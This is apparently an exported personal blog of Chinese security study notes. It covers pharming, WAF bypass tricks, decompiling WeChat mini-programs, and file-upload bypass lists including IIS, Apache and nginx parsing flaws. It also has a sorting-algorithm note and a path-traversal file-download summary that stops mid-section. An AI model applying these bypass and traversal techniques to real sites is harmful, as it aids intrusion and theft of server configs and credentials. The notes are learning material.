<h1 id="六、域欺骗"><a href="#六、域欺骗" class="headerlink" title="六、域欺骗"></a>六、域欺骗</h1><p>随着用户对传统网络钓鱼诈骗越来越了解，一些欺诈者正在完全放弃“引诱”受害者的想法。相反，他们正在求助于<strong>pharming</strong>。这种网络钓鱼方法利用针对域名系统 (DNS) 的缓存中毒，DNS 是一种命名系统，Internet 使用该系统将字母网站名称（例如“ <a href="http://www.microsoft.com/">www.microsoft.com</a> ”）转换为数字 IP 地址，以便它可以定位，从而引导访问者访问计算机服务和设备。</p>
<p>在 DNS 缓存中毒攻击中，攻击者以 DNS 服务器为目标并更改与目标网站名称关联的 IP 地址。这意味着攻击者可以将用户重定向到他们选择的恶意网站。即使受害者输入了正确的站点名称也是如此。</p>
<h2 id="域欺骗中使用的技术"><a href="#域欺骗中使用的技术" class="headerlink" title="域欺骗中使用的技术"></a>域欺骗中使用的技术</h2><ul>
<li>恶意电子邮件代码：在这种域欺骗攻击变体中，恶意行为者发送包含修改收件人计算机上的主机文件的恶意代码的电子邮件。这些主机文件随后将所有 URL 重定向到攻击者控制下的网站，以便他们可以安装恶意软件或窃取受害者的信息。</li>
<li>以 DNS 服务器为目标：或者，恶意行为者可能会选择跳过以个人用户的计算机为目标并直接攻击 DNS 服务器。这可能会危及数百万网络用户的 URL 请求。</li>
</ul>
<h2 id="如何抵御域欺骗"><a href="#如何抵御域欺骗" class="headerlink" title="如何抵御域欺骗"></a>如何抵御域欺骗</h2><p>为防止域欺骗攻击，组织应鼓励员工仅在受 HTTPS 保护的站点上输入登录凭据。公司还应在所有公司设备上部署防病毒软件，并定期更新病毒库。最后，他们应该掌握由受信任的互联网服务提供商 (ISP) 发布的安全升级。</p>
<h1 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h1><p>使用上面的指南，组织可以发现一些最常见的网络钓鱼攻击类型。即便如此，这并不意味着他们能够发现每一个网络钓鱼。网络钓鱼不断发展以采用新的形式和技术。考虑到这一点，组织必须持续进行安全意识培训，以便他们的员工和管理人员能够掌握网络钓鱼的演变。这与自动化安全方法齐头并进，该方法与当今网络钓鱼趋势保持同步，并构建了面向未来的防御所需的策略。</p>
]]></content>
      <categories>
        <category>钓鱼</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>钓鱼攻击方式</tag>
      </tags>
  </entry>
  <entry>
    <title>常规绕WAF思路</title>
    <url>/2022/03/08/%E5%B8%B8%E8%A7%84%E7%BB%95WAF%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h2 id="1、错误的HTTP请求头"><a href="#1、错误的HTTP请求头" class="headerlink" title="1、错误的HTTP请求头"></a>1、错误的HTTP请求头</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">类似文件上传时的绕过，通过畸形的HTTP协议头绕过WAF检测。比如绕过某些老版本WAF可以加入请求头：<span class="attribute">Content</span>-Encoding:deflate就可以绕过WAF（此方法在文件上传绕过WAF中也适用）</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h2 id="2、通用的关键字绕过"><a href="#2、通用的关键字绕过" class="headerlink" title="2、通用的关键字绕过"></a>2、通用的关键字绕过</h2><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">将关键字转换成Unicode或者<span class="built_in">HEX</span>编码的方式，JAVA程序会自动进行解码，所以在一定程度上能够绕过WAF</span><br></pre></td></tr></table></figure>

<h2 id="3、使用未公开的漏洞利用链"><a href="#3、使用未公开的漏洞利用链" class="headerlink" title="3、使用未公开的漏洞利用链"></a>3、使用未公开的漏洞利用链</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">部分WAF会将公开的漏洞利用链中的关键字设置为黑名单，所以重新找一条利用链吧，自己的才是最香的</span><br></pre></td></tr></table></figure>

<h2 id="4、数据溢出-防匹配（xxx…）"><a href="#4、数据溢出-防匹配（xxx…）" class="headerlink" title="4、数据溢出-防匹配（xxx…）"></a>4、数据溢出-防匹配（xxx…）</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">借助常见的溢出漏洞，在数据特别多的情况下例如：构造垃圾数据，让防护的检测负载不过来在某个地方停止，从而达到绕过的目的例如在数据包内（文件名等可修改的区域）处构造大量垃圾数据，但是有可能会导致服务器崩溃，从而无法接下去进行操作</span><br></pre></td></tr></table></figure>

<h2 id="5、符号变异-防匹配（’”-）"><a href="#5、符号变异-防匹配（’”-）" class="headerlink" title="5、符号变异-防匹配（’”;）"></a>5、符号变异-防匹配（’”;）</h2><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">利用匹配的原则，猜测waf是根据在单引号或者双引号里面的数据去匹配文件名信息的，那么可以利用这个规则，将引号替换掉，尝试绕过，有可能它只检测单引号或者只检测双引号，也可尝试去掉一个引号，有开始就有结束，当去掉一个之后就可能被检测出来，或者没检测出来，或者什么都没发生这样，也可尝试将引号全部去除，而分号是利用分号后面还有数据的形式，在后面添加垃圾数据去尝试绕过</span><span class="string">,</span><span class="comment">或者构造文件名或者在引号后面写文件名，而引号内部不去写数据，或者单纯写一个a这样的数据尝试绕过</span></span><br></pre></td></tr></table></figure>

<h2 id="6、重复数据-防匹配（参数多次）"><a href="#6、重复数据-防匹配（参数多次）" class="headerlink" title="6、重复数据-防匹配（参数多次）"></a>6、重复数据-防匹配（参数多次）</h2><figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">例如：构造多个<span class="meta">filename</span>，然后查看waf最后是以哪个为主，然后构造多个<span class="meta">filename</span>，借助检测机制是递归循环，还是单次检测，类似于构造垃圾数据那样也可尝试将Content-Disposition这些的数据插入到<span class="meta">filename</span>里面去，然后后面构造php文件（利用白名单）</span><br></pre></td></tr></table></figure>

<h2 id="7、数据截断-防匹配（-00-换行）"><a href="#7、数据截断-防匹配（-00-换行）" class="headerlink" title="7、数据截断-防匹配（%00;/;换行）"></a>7、数据截断-防匹配（%00;/;换行）</h2>]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序反编译-PC微信版</title>
    <url>/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/</url>
    <content><![CDATA[<p>现在网上也有很多关于小程序反编译的教程，随时间的流逝或许随着微信的更新，有出现编译不成功的现象。</p>
<p>本篇文章总结一下最新的编译过程，已成功获得小程序源码（有分包的小程序）</p>
<span id="more"></span>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="1、-node-环境准备"><a href="#1、-node-环境准备" class="headerlink" title="1、 node 环境准备"></a>1、 node 环境准备</h3><p>下载链接：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a></p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/image-20220829114303810.png" alt="image-20220829114303810"></p>
<p>安装后将nodejs设置为环境变量。<br> 打开cmd，测试是否安装成功：在命令行输入node -v 出现版本号说明已经安装成功。</p>
<h3 id="2、反编译工具"><a href="#2、反编译工具" class="headerlink" title="2、反编译工具"></a>2、反编译工具</h3><p>项目地址来自于：<a href="https://github.com/xuedingmiaojun/wxappUnpacker">https://github.com/xuedingmiaojun/wxappUnpacker</a></p>
<p><strong>通过下面链接下载：</strong></p>
<p>链接：<a href="https://pan.baidu.com/share/init?surl=p-wnX-mXr-Du0iJK_dT8RQ">https://pan.baidu.com/share/init?surl=p-wnX-mXr-Du0iJK_dT8RQ</a><br> 提取码：z06a</p>
<p><strong>下载下来解压到某个位置就可以了，一定要通过网盘下载，里面有解密包的工具和安装后的npm环境，直接使用即可</strong></p>
<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><h3 id="1、微信PC获取小程序"><a href="#1、微信PC获取小程序" class="headerlink" title="1、微信PC获取小程序"></a>1、微信PC获取小程序</h3><p><strong>在通过微信PC打开小程序前，我们最好先找到缓存到本地的小程序包路径，一般都是在 <code>微信PC安装目录\WeChat Files\WeChat Files\Applet</code></strong></p>
<p>比如我的就是安装到 <code>D盘根目录的</code>，所以路径为： <code>D:\WeChat\WeChat Files\WeChat Files\Applet</code></p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/image-20220829114327613.png" alt="image-20220829114327613"></p>
<p><strong>上图中每个文件夹代表一个小程序，一般最新打开的小程序都是在第一个，如果不确定可以排序一下修改日期</strong></p>
<p>找到路径了我们就可以用微信PC打开小程序了，打开后就会发现当前目录新增了一个文件夹，里面存放的就是加密后的小程序包</p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/image-20220829114344379.png" alt="image-20220829114344379"></p>
<h3 id="2、解密包"><a href="#2、解密包" class="headerlink" title="2、解密包"></a>2、解密包</h3><p>刚获取到的包我们还不能进行反编译，必须要通过 <code>解密软件</code> 修改一下才能反编译</p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/image-20220829114403452.png" alt="image-20220829114403452"></p>
<p><strong>本篇就演示一个主包和一个分包反编译的过程就可以了，先通过<code>解密软件</code>修改一下主包</strong></p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/image-20220829114420124.png" alt="image-20220829114420124"></p>
<p><strong>解密的主包自动到 <code>wxpack</code> 这个包里面来了，同样的步骤解密一个分包，下图是我解密好的两个，并且修改了一下名称，好区分</strong></p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/image-20220829114429172.png" alt="image-20220829114429172"></p>
<h3 id="3、反编译"><a href="#3、反编译" class="headerlink" title="3、反编译"></a>3、反编译</h3><p>进入 <code>wxpack</code> 的同级目录 <code>wxappUnpacker-master</code>，在路径栏输入 <code>cmd</code> 自动打开当前目录的 <strong>命令窗口了</strong></p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/image-20220829114439361.png" alt="image-20220829114439361"></p>
<p><strong>先反编译一下主包，把反编译后的文件夹放到 <code>wxpack</code> 同级目录中</strong></p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">node</span> <span class="title">wuWxapkg</span>.js ..\wxpack\<span class="literal">master</span>-app.wxapkg</span><br><span class="line"></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/image-20220829114447311.png" alt="image-20220829114447311"></p>
<p><strong>再反编译分包，把反编译后的文件夹放到 <code>wxpack</code> 同级目录中</strong></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">node wuWxapkg.js <span class="attr">-s</span>=..\ ..\wxpack\_pages_app.wxapkg</span><br><span class="line"></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-s</code> 表示分包</li>
<li>第一个<code>..\</code> 表示输出位置</li>
<li><code>..\wxpack\_pages_app.wxapkg</code> 需要反编译的分包位置</li>
</ul>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-PC%E5%BE%AE%E4%BF%A1%E7%89%88/image-20220829114505256.png" alt="image-20220829114505256"></p>
<p>好了剩下的就是自己组合一下包的架构目录了~~~~</p>
]]></content>
      <categories>
        <category>反编译</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序反编译-模拟器版</title>
    <url>/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/</url>
    <content><![CDATA[<p>本文主要写如何通过PC手机模拟器获取微信小程序的代码</p>
<span id="more"></span>
<p>网易 Mumu 模拟器安装</p>
<ul>
<li>打开模拟器</li>
</ul>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/image-20220829114548179.png" alt="image-20220829114548179"></p>
<ul>
<li>安装 微信、RE文件管理器</li>
</ul>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/image-20220829114558552.png" alt="image-20220829114558552"></p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/image-20220829114605733.png" alt="image-20220829114605733"></p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/image-20220829114612458.png" alt="image-20220829114612458"></p>
<ul>
<li>设置Root 权限</li>
</ul>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/image-20220829114620760.png" alt="image-20220829114620760"></p>
<ul>
<li>打开 RE文件管理器，提示请求超级用户访问权限，选择允许</li>
</ul>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/image-20220829114627290.png" alt="image-20220829114627290"></p>
<p>到此准备工作完成。</p>
<h3 id="打开微信，然后打开小程序，获取小程序编译包"><a href="#打开微信，然后打开小程序，获取小程序编译包" class="headerlink" title="打开微信，然后打开小程序，获取小程序编译包"></a>打开微信，然后打开小程序，获取小程序编译包</h3><ul>
<li>先打开微信</li>
<li>搜索微博小程序打开</li>
<li>打开RE文件管理</li>
<li>按照 /data/data/com.tencent.mm/MicroMsg/80b34bca4945f2aa19a92b5549781131/appbrand/pkg/小程序.wxapkg 路径找到对应程序包</li>
</ul>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/image-20220829114637217.png" alt="image-20220829114637217"></p>
<p>压缩对应的小程序包</p>
<p>查看压缩包，长按并选中然后发送给微信好友，将此文件解压到指定文件夹下</p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/image-20220829114644948.png" alt="image-20220829114644948"></p>
<p>解压放到wechart 文件夹下</p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/image-20220829114653807.png" alt="image-20220829114653807"></p>
<p>反编译小程序压缩包 在文件夹下克隆反编译工具</p>
<p>git clone <a href="https://github.com/qwerty472123/wxappUnpacker.git">https://github.com/qwerty472123/wxappUnpacker.git</a></p>
<p>cd wxappUnpacker npm i</p>
<p>执行node node wuWxapkg.js + wxapkg文件路径 即可生成反编译后的微信小程序文件夹</p>
<p><img src="https://ax-x.github.io/2022/08/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%89%88/1460000039121223.png" alt="img"></p>
<p>使用编辑器打开项目即可。</p>
]]></content>
      <categories>
        <category>反编译</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞个人总结</title>
    <url>/2022/03/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="什么是文件上传"><a href="#什么是文件上传" class="headerlink" title="什么是文件上传"></a>什么是文件上传</h2><p>文件上传漏洞是指上传文件的时，如果未对上传的文件进行严格的验证和过滤，就容易造成文件上传漏洞，上传脚本等。用户可以上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。 常见场景是web服务器允许用户上传图片或者普通文本文件保存，而用户绕过上传机制上传恶意代码并执行从而控制服务器。这种漏洞是getshell最快最直接的方法之一，上传文件操作本身是没有问题的，问题在于文件上传到服务器后，服务器怎么处理和解释文件，有文件上传不一定有文件上传漏洞，要看代码情况。</p>
<span id="more"></span>
<h2 id="文件上传危害"><a href="#文件上传危害" class="headerlink" title="文件上传危害"></a>文件上传危害</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">自定义上传什么东西，通过文件上传上传网站后门，拿到网站权限，高危漏洞</span><br></pre></td></tr></table></figure>

<h2 id="如何查找"><a href="#如何查找" class="headerlink" title="如何查找"></a>如何查找</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">黑盒查找：代码，网站情况是不知道的需要自己判断，需要用扫描器去扫描敏感文件，扫描常见的上传地址，通过网站给出的上传应用或者后台去找。</span><br><span class="line">白盒查找：拿到源码，cms等等判断</span><br><span class="line">通过抓包修改数据进行判断</span><br></pre></td></tr></table></figure>

<h2 id="文件上传常见验证方式"><a href="#文件上传常见验证方式" class="headerlink" title="文件上传常见验证方式"></a>文件上传常见验证方式</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">后缀名：类型，文件头等</span><br><span class="line">文件头，MIME信息，image/gif，后缀</span><br><span class="line"><span class="section">黑名单:明确不让上传的格式后缀（黑名单缺陷：定义后缀名不完整的情况，可以通过其他格式绕过达到同样的效果，具体情况具体看待）asp php jsp aspx cgi war</span></span><br><span class="line">黑名单缺陷：php5，phtml（例如PHP：如果对方支持这个类型的格式的话是可以运行的）</span><br><span class="line"><span class="section">白名单:明确可以上传的格式后缀（白名单相对黑名单要安全点）Jpg png zip rar gif</span></span><br><span class="line"><span class="section">文件类型:MIME信息image/gif</span></span><br></pre></td></tr></table></figure>

<h2 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h2><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">JS验证绕过</span><br><span class="line">特殊解析后缀（php3，php5，phtml），.htaccess（apache）</span><br><span class="line">大小写</span><br><span class="line">点绕过</span><br><span class="line">空格绕过</span><br><span class="line">::<span class="variable">$$</span>DATA</span><br><span class="line">双后缀名绕过</span><br><span class="line">MIME绕过</span><br><span class="line">截断</span><br><span class="line">文件头检测</span><br><span class="line">二次渲染</span><br><span class="line">条件竞争</span><br><span class="line">突破getimagesize</span><br><span class="line">突破exif_imagetype</span><br></pre></td></tr></table></figure>

<h2 id="上传参数名解析-明确哪些东西能修改？"><a href="#上传参数名解析-明确哪些东西能修改？" class="headerlink" title="上传参数名解析:明确哪些东西能修改？"></a>上传参数名解析:明确哪些东西能修改？</h2><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition-</span>:一般可更改</span><br><span class="line"><span class="attribute">name</span>:表单参数值，不能更改</span><br><span class="line"><span class="attribute">filename</span>:文件名，可以更改</span><br><span class="line"><span class="attribute">Content-type</span>:文件</span><br><span class="line">MIME，视情况更改</span><br></pre></td></tr></table></figure>

<h2 id="文件上传安全修复方案"><a href="#文件上传安全修复方案" class="headerlink" title="文件上传安全修复方案"></a>文件上传安全修复方案</h2><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">后端验证：采用服务端验证模式</span><br><span class="line">后缀检测：基于黑名单，白名单过滤</span><br><span class="line">MIME检测：基于上传自带类型检测</span><br><span class="line">内容检测：文件头，完整性检测,后缀等等</span><br><span class="line">自带函数过滤：参考 uploadlabs函数</span><br><span class="line">自定义函数过滤：<span class="keyword">function</span> <span class="title">check_file</span>()</span><br><span class="line">WAF防护产品：安全狗，宝塔，云盾，安全公司类似产品等</span><br></pre></td></tr></table></figure>

<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h3><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">建立\*.asa,\*.asp文件夹时，文件夹下的任意文件都会被当成asp文件来执行</span><br><span class="line">\*.asp;1.jpg同样会被当成asp脚本执行</span><br></pre></td></tr></table></figure>

<h3 id="IIS-7-0-7-5"><a href="#IIS-7-0-7-5" class="headerlink" title="IIS 7.0/7.5"></a>IIS 7.0/7.5</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">默认Fast-CGI开启，直接在url中图片地址后面输入<span class="string">/1.php</span>，会把正常图片当成php解析</span><br></pre></td></tr></table></figure>

<h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">当文件拓展名Apache没有配置解析器解析时，就会向前遍历，直到遇到配置的解析器解析的域名</span><br></pre></td></tr></table></figure>

<h3 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">上传<span class="string">/.php</span>时就能作为php文件解析</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>排序算法</title>
    <url>/2022/03/25/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<ol>
<li>直接插入排序，将一个记录插入到已排序好的有序表中，从而得到一个新，记录数增1的有序表。即：先将序列的第1个记录看成是一个<strong>有序的子序列</strong>，然后从第2个记录逐个进行插入，直至<strong>整个序列</strong>有序为止。<span id="more"></span></li>
<li>希尔排序，先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，待整个序列中的记录“基本有序”时，再对全体记录进行依次直接插入排序</li>
<li>简单选择排序，在要排序的一组数中，选出最小（或者最大）的一个数与第1个位置的数交换；然后在剩下的数当中再找最小（或者最大）的与第2个位置的数交换，依次类推，直到第n-1个元素（倒数第二个数）和第n个元素（最后一个数）比较为止。</li>
<li>堆排序，由堆的定义可以看出，<strong>堆顶元素</strong>（即第一个元素）必为最小项（小顶堆）。<br>若以一维数组存储一个堆，则堆对应一棵完全二叉树，且所有非叶结点的值均不大于(或不小于)其子女的值，根结点（堆顶元素）的值是最小(或最大)的</li>
<li>冒泡排序，在要排序的一组数中，对当前还未排好序的范围内的全部数，自上而下对相邻的两个数依次进行比较和调整，让较大的数往下沉，较小的往上冒。即：每当两相邻的数比较后发现它们的排序与排序要求相反时，就将它们互换。</li>
<li>快速排序</li>
<li>1）选择一个基准元素,通常选择第一个元素或者最后一个元素,</li>
<li>2）通过一趟排序将待排序的记录分割成独立的两部分，其中一部分记录的元素值均比基准元素值小。另一部分记录的 元素值比基准值大。</li>
<li>3）此时基准元素在其排好序后的正确位置</li>
<li>4）然后分别对这两部分记录用同样的方法继续进行排序，直到整个序列有序。</li>
<li>归并排序</li>
<li>归并（Merge）排序法是将两个（或两个以上）有序表合并成一个新的有序表，即把待排序序列分为若干个子序列，每个子序列是有序的。然后再把有序子序列合并为整体有序序列。</li>
<li>基数排序</li>
<li>是将阵列分到有限数量的桶子里。每个桶子再个别排序（有可能再使用别的排序算法或是以递回方式继续使用桶排序进行排序）。桶排序是鸽巢排序的一种归纳结果。当要被排序的阵列内的数值是均匀分配的时候，桶排序使用线性时间（Θ（n））。但桶排序并不是 比较排序，他不受到 O(n log n) 下限的影响。</li>
</ol>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>文件下载漏洞个人总结</title>
    <url>/2022/03/08/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>文件下载功能没有对下载的文件类型、目录做合理严谨的过滤， 利用路径回溯符…/跳出程序本身的限制目录实现来下载任意文件，导致用户可以下载服务器的任意文件。</p>
<span id="more"></span>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">存在读文件的函数</span><br><span class="line">读取文件的路径用户可控且未校验或校验不严</span><br><span class="line">输出了文件内容</span><br></pre></td></tr></table></figure>

<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">可以下载服务器的任意文件，web业务的代码，服务器和系统的具体配置信息，也可以下载数据库的配置信息，以及对内网的信息探测等等。</span><br><span class="line">可用得到的代码进一步代码审计，得到更多可利用漏洞</span><br><span class="line">任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。</span><br></pre></td></tr></table></figure>

<h2 id="如何发现"><a href="#如何发现" class="headerlink" title="如何发现"></a>如何发现</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">网站URL中存在下载参数，并且未进行过滤…<span class="regexp">/…/</span>…/字符，且输出了文件内容</span><br><span class="line">从链接上看</span><br><span class="line">从参数上看</span><br><span class="line">具体情况具体分析</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">获得站点源码（黑盒 -&gt; 白盒）</span><br><span class="line">获得站点与中间件配置文件</span><br><span class="line">获得应用于系统配置文件（ssh、mysql）</span><br></pre></td></tr></table></figure>

<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">（信息收集信息&gt;猜路径 &gt;&gt;下载配置文件/代码文件 &gt;&gt; 利用服务器软件漏洞&gt; <span class="built_in">shell</span>&gt; 提权）</span><br><span class="line">任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。</span><br><span class="line">下载常规的配置文件，例如: ssh,weblogic,<span class="keyword">ftp</span>,mysql等相关配置下载各种.<span class="built_in">log</span>文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。</span><br><span class="line">下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器</span><br></pre></td></tr></table></figure>

<h2 id="常规文件位置"><a href="#常规文件位置" class="headerlink" title="常规文件位置"></a>常规文件位置</h2><p><strong>WEB应用</strong></p>
